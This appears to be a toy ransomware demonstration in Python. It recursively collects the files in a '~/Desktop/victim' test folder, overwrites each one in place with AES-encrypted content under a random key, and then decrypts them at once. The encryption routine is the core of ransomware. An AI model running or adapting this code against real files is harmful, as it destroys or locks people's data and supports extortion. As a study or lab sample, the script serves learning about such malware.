from aes import AES
import os

def open_folder(folder_name):
    files = []
    for item in os.listdir(folder_name):
        path = folder_name + "/" + item
        if os.path.isfile(path):
            files.append(path)
        else:
            [files.append(file) for file in open_folder(path)]

    return files


def encrypt_files(files):
    key = os.urandom(32)
    aes = AES.AES(key)
    ivs = {}
    for file in files:
        with open(file, 'rb') as f_in:
            content = f_in.read()
            encrypted_content, iv = aes.encrypt(content)
            ivs[file] = iv

        with open(file, "wb") as f_out:
            f_out.write(encrypted_content)

    return key, ivs


def decrypt_files(files, key, ivs):
    aes = AES.AES(key)
    for file in files:
        with open(file, 'rb') as f_in:
            content = f_in.read()
            decrypted_content = aes.decrypt(content, ivs[file])

        with open(file, 'wb') as f_out:
            f_out.write(decrypted_content)


os.system("sh create_data.sh")

filesToEncrypt = open_folder(os.path.expanduser("~/Desktop/victim"))
#print(filesToEncrypt)
key, ivs = encrypt_files(filesToEncrypt)
decrypt_files(filesToEncrypt, key, ivs)
